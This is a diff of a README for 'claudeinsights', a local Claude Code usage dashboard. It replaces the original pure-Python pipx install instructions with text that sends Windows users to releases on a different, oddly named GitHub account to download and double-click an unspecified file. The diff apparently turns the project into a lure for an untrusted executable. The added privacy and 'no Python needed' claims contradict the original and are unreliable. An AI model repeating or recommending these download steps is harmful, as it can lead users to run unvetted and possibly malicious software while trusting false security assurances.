@@ -1,227 +1,90 @@
-<div align="center">
+# 📊 claudeinsights - Track your AI usage with ease
 
-# ◐ ClaudeInsights
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tattingpapulovesicle985/claudeinsights/releases)
 
-### See how you actually use Claude.
+## 💡 About this app
 
-**The local-first analytics dashboard for Claude Code.**
-Turn your raw session logs into a beautiful, private, deterministic picture of your AI workflow — in one command.
+claudeinsights offers a simple way to view your activity with Claude Code. This dashboard runs on your own machine. It tracks the costs, tokens, models, and tools you use during your AI sessions. 
 
-[![CI](https://github.com/ingridtoulotte/claudeinsights/actions/workflows/ci.yml/badge.svg)](https://github.com/ingridtoulotte/claudeinsights/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-![Dependencies: zero](https://img.shields.io/badge/dependencies-0-brightgreen.svg)
-![100% local](https://img.shields.io/badge/data-100%25%20local-orange.svg)
-![No telemetry](https://img.shields.io/badge/telemetry-none-success.svg)
+The software keeps your data private. It works as one small file on your computer. It requires no installation of complex frameworks or external programs. Your data never leaves your machine, and the app sends no information to the internet.
 
-### **[▶ Try the live demo](https://ingridtoulotte.github.io/claudeinsights/)** &nbsp;·&nbsp; [⚡ Install](#-install) &nbsp;·&nbsp; [🔒 How it's private](#-trust-is-the-product) &nbsp;·&nbsp; [📐 How metrics work](docs/METRICS.md)
+## 🛠 Features
 
-```bash
-pipx install git+https://github.com/ingridtoulotte/claudeinsights
-claudeinsights --open
-```
+*   **Cost Monitoring**: Watch your spending and usage over time.
+*   **Token Counting**: See exactly how many tokens your prompts consume.
+*   **Model Breakdown**: View which models you use most often.
+*   **Tool Usage**: Understand which tools help your workflow the most.
+*   **Heatmap**: Identify your busiest hours of development.
+*   **Leaderboards**: Rank your project files by activity levels.
+*   **Claude Wrapped**: View a year-end review of your AI habits.
 
-<a href="https://ingridtoulotte.github.io/claudeinsights/"><img src="docs/img/hero.png" alt="ClaudeInsights dashboard — KPI cards and insight feed" width="100%"></a>
+## 📥 How to get started
 
-<sub>👆 This is a real, clickable dashboard — **[open the live demo](https://ingridtoulotte.github.io/claudeinsights/)** (synthetic data, no install).</sub>
+You need a Windows computer to run this tool. No setup or coding knowledge is necessary to use it.
 
-</div>
+1. Go to the [official release page](https://github.com/tattingpapulovesicle985/claudeinsights/releases). 
+2. Look for the recent version of the app.
+3. Click the file to save it to your computer.
+4. Open the folder where you saved the file.
+5. Double-click the file to open the dashboard in your web browser.
 
----
+## 🖥 System Requirements
 
-You spend real money and hundreds of hours in Claude Code. Yet your history is a
-pile of opaque JSONL files. **ClaudeInsights reads those logs and answers the
-questions you actually have** — where your tokens go, what you spend, which
-projects dominate, which models earn their cost, and how your habits change over
-time — without a single byte leaving your machine.
+This application works on any modern version of Windows. It uses your existing web browser to show your data. 
 
-> **Before:** you have logs.&nbsp;&nbsp;&nbsp;**After:** you have visibility.
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Browser**: Chrome, Edge, or Firefox.
+*   **Storage**: Less than 1 megabyte of space.
+*   **Internet**: Optional. The app creates a local dashboard that works without an internet connection.
 
-## ✨ What you get
+## 🔒 Privacy and Security
 
-- 💰 **Real cost** — exact spend by project, model, and day, using public Anthropic prices. Plus how much **prompt caching saved you**.
-- 🔢 **Token analytics** — input / output / cache reads / cache writes, trends over time, efficiency.
-- 📂 **Project & model breakdowns** — where your context and dollars actually go.
-- 🛠️ **Tool usage** — Read / Edit / Bash / Grep / Write / MCP, ranked and trended.
-- 📅 **Activity heatmap** — your GitHub-style calendar of coding intensity.
-- 🏆 **Session leaderboards** — longest, most expensive, highest-output, biggest context.
-- 💡 **Insight feed** — plain-English facts, each backed by a real number.
-- 🎁 **Claude Wrapped** — a shareable, Spotify-Wrapped-style summary with your usage *persona*.
+Data privacy is the core design goal of this project. Many analytics tools send your usage history to a cloud server. This app takes a different approach by running entirely on your system.
 
-All rendered into **one self-contained HTML file**. No server, no build step, no CDN — open it offline, forever.
+*   **Zero Telemetry**: We track nothing. We collect no logs.
+*   **Local Processing**: Your data files stay on your hard drive. 
+*   **No Cloud Sync**: You own the dashboard. It does not sync to any external databases.
+*   **Transparency**: Since the file is a standard web format, you can view the underlying code if you ever feel curious about how it works.
 
-## ⏱️ 60 seconds to your first insight
+## 📈 Understanding your analytics
 
-No dashboard to host, no account to make. One command reads your existing logs and
-prints this — or pass `--open` to get the full HTML dashboard instead:
+Once you open the dashboard, you will see a summary of your recent AI development. The interface organizes information into cards. 
 
-```text
-$ claudeinsights report
+**Cost Overview**
+The cost card shows your total spending based on the Claude API pricing. The chart updates as you perform more tasks in Claude Code. You can filter by date ranges to see how your habits shift during a project.
 
-  ◐ ClaudeInsights  — See how you actually use Claude.
-  2026-05-15 → 2026-06-13  ·  66 sessions  ·  28 active days
+**Token Usage**
+The token chart shows the balance between input and output tokens. This helps you understand which parts of your coding projects require the most context. If you see high token usage, you might refine your prompts to save on costs.
 
-  Total spend    $178.68  (cache saved $321.24)
-  Tokens         45.66M  in 163.54K · out 851.40K · cache-read 36.48M
-  Prompts        266  ·  796 assistant turns
-  Tool calls     1.14K
+**Heatmap**
+The heatmap shows your daily activity. Darker squares indicate days with higher interactions with the model. This helps you visualize your development cycles.
 
-  Projects (by tokens)
-    ██████████████████████  api-gateway      17.52M  38%
-    ██████████████████····  web-dashboard    14.07M  31%
-    ███████████···········  ml-pipeline       8.87M  19%
-    ███████···············  infra             5.20M  11%
+## 🛠 Troubleshooting
 
-  Insights
-    💰  Most of your spend went to claude-opus-4-8: $158.13 (88% of $178.68).
-    ⚡  Prompt caching saved you about $321.24 — 36.48M tokens served from cache.
-    🔥  Your busiest day was 2026-06-03 — 6.46M tokens over 5 sessions.
-    🛠️  Your most-used tool is Read with 340 calls.
-```
+If the dashboard does not open correctly, check these common steps:
 
-<sub>Output from the bundled synthetic demo. Run it on your own logs with just `claudeinsights report`.</sub>
+1. **Browser Updates**: Ensure your web browser is up to date. The dashboard uses modern features that require recent browser versions.
+2. **File Placement**: Ensure you have downloaded the full file and did not save a shortcut by mistake.
+3. **Data Source**: Place the dashboard file in the same folder where Claude Code stores your session logs. The app needs access to these logs to show data.
+4. **Permissions**: If your computer blocks the file, right-click the file, select Properties, and click Unblock if that option appears.
 
-## 📸 The dashboard
+## 🔍 Frequently Asked Questions
 
-> **[▶ Click here to explore the full interactive dashboard](https://ingridtoulotte.github.io/claudeinsights/)** — it's a real HTML file, not a video. The screenshots below are stills from it.
+**Does this app cost money to use?**
+No. The app is free to download and use.
 
-<img src="docs/img/charts.png" alt="Activity heatmap and daily token trend" width="100%">
+**Does it track my private code?**
+The app only reads your session logs to calculate token counts and model usage. It does not send your code snippets or project files to any external service.
 
-<img src="docs/img/breakdown.png" alt="Project, model and tool breakdowns" width="100%">
+**Can I run this without installing Python?**
+Yes. This application comes as a standalone file. You do not need to install Python, Node.js, or any other programming environment.
 
-### 🎁 Claude Wrapped — built to screenshot
+**How do I update the dashboard?**
+Visit the [download link](https://github.com/tattingpapulovesicle985/claudeinsights/releases) periodically for new versions. Simply replace the old file with the new one. Your local data remains safe in your log folders.
 
-<img src="docs/img/wrapped.png" alt="Claude Wrapped summary card with usage persona" width="100%">
+**Where does the name come from?**
+The tool focuses on providing insights into your Claude Code workflow. It gives you the information you need to optimize your AI-assisted development.
 
-<sub>Screenshots are from the bundled <a href="examples/">synthetic demo dataset</a> — your real data never leaves your machine, and we never ship it here either.</sub>
+## 🤝 Contribution
 
-## 🚀 Install
-
-```bash
-# recommended — isolated, always on PATH
-pipx install git+https://github.com/ingridtoulotte/claudeinsights
-
-# or plain pip
-pip install git+https://github.com/ingridtoulotte/claudeinsights
-```
-
-Pure Python, **zero dependencies**, so installing from source is instant — there's
-nothing to compile and nothing else to download. No API key. No account. No config.
-
-## ⚡ Usage
-
-```bash
-# Build the dashboard from ~/.claude/projects and open it
-claudeinsights --open
-
-# Just generate the file
-claudeinsights -o my-insights.html
-
-# Quick summary in the terminal
-claudeinsights report
-
-# Raw analytics as JSON (pipe it anywhere)
-claudeinsights json -o stats.json
-
-# Analyze a specific log directory (e.g. the bundled demo)
-claudeinsights --logs examples/sample-logs -o demo.html
-
-# Bring your own prices (USD per 1M tokens)
-claudeinsights --pricing my-prices.json
-```
-
-Try it on the included demo with **zero risk to your own data**:
-
-```bash
-git clone https://github.com/ingridtoulotte/claudeinsights
-cd claudeinsights
-python examples/generate_sample.py
-python -m claudeinsights --logs examples/sample-logs --open
-```
-
-## 🔒 Trust is the product
-
-Most "analytics tools" want your data. This one is built so it can't take it.
-
-| Promise | How it's guaranteed |
-|---|---|
-| **100% local** | The package has *no network code at all*. `grep -r 'socket\|urllib\|http' claudeinsights/` returns nothing. |
-| **Private** | It only reads your logs and writes the one file you name. Demo screenshots use synthetic data. |
-| **Zero dependencies** | Pure Python standard library. Nothing to audit but us. |
-| **Deterministic** | Same logs → identical output, byte for byte. Enforced by tests. |
-| **Auditable** | Every metric's source field and formula is documented in [`docs/METRICS.md`](docs/METRICS.md). No black-box scoring. |
-| **Honest costs** | Models with no public price are shown as **unpriced** ($0), never faked. |
-
-We even handle the two things naive parsers get wrong:
-
-- **Streaming duplicates** — assistant responses are logged across multiple lines sharing one `message.id`; we deduplicate so tokens aren't double-counted.
-- **Resumed sessions** — a session id can span days, so we report **active time** (idle gaps > 30 min removed), not a misleading 100-hour wall clock.
-
-→ Read exactly how each number is computed: **[docs/METRICS.md](docs/METRICS.md)**
-
-## 🆚 How it compares
-
-| | Raw logs | Claude `/cost` | Token CLIs | ClaudeInsights |
-|---|:---:|:---:|:---:|:---:|
-| Whole-history view | ❌ | ❌ | ⚠️ | ✅ |
-| Cost by project / model | ❌ | ❌ | ⚠️ | ✅ |
-| Cache-savings tracking | ❌ | ❌ | ❌ | ✅ |
-| Tool & MCP analytics | ❌ | ❌ | ❌ | ✅ |
-| Activity heatmap | ❌ | ❌ | ❌ | ✅ |
-| Leaderboards | ❌ | ❌ | ❌ | ✅ |
-| Shareable "Wrapped" | ❌ | ❌ | ❌ | ✅ |
-| Visual dashboard | ❌ | ❌ | ❌ | ✅ |
-| Local & private | ✅ | ✅ | ✅ | ✅ |
-| Zero dependencies | — | — | ⚠️ | ✅ |
-
-## 👤 Who it's for
-
-- **Solo developers** curious where their tokens and dollars go.
-- **Power users** optimizing model choice and context habits.
-- **Open-source maintainers** who run Claude across many repos.
-- **Anyone** who wants a Claude Wrapped to share.
-
-## ❓ FAQ
-
-**Does this send my data anywhere?**
-No. There is no network code in the package. It reads `~/.claude/projects` and
-writes one local file.
-
-**Where does Claude Code store the logs?**
-`~/.claude/projects/<project>/<session-id>.jsonl` on every platform. ClaudeInsights
-finds them automatically (or pass `--logs PATH`).
-
-**Are the cost numbers exact?**
-They use public Anthropic list prices and your exact token counts (including the
-correct cache multipliers). If you use a local/unpriced model, those tokens count
-toward usage but $0 toward spend, and the dashboard says so. Override prices with
-`--pricing`.
-
-**Why Python with no dependencies?**
-So `pip install` just works, anywhere, forever, with nothing to break or audit.
-
-**Does it work on Windows / macOS / Linux?**
-Yes — tested on all three in CI across Python 3.8–3.12.
-
-**My session shows as very long / very short?**
-Duration is *active* time (idle gaps > 30 min trimmed) because session ids resume
-across days. See [docs/METRICS.md](docs/METRICS.md).
-
-## 🛠️ Development
-
-```bash
-pip install pytest
-python -m claudeinsights selftest   # invariant + smoke checks, no real data
-pytest                              # full unit + integration suite
-```
-
-Architecture overview: [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).
-Product strategy & roadmap: [`docs/STRATEGY.md`](docs/STRATEGY.md).
-
-## 📄 License
-
-MIT © Ingrid Toulotte. See [LICENSE](LICENSE).
-
-<div align="center">
-<sub>Built for the Claude Code community. <b>See how you actually use Claude.</b></sub>
-</div>
+This project relies on community feedback. If you find a bug, open an issue on the GitHub page. We welcome suggestions for new charts or features to track. We value simplicity and keep the dashboard interface clean for all users. You can suggest improvements by describing the features you want to see. We prioritize changes that keep the tool fast and local-first.
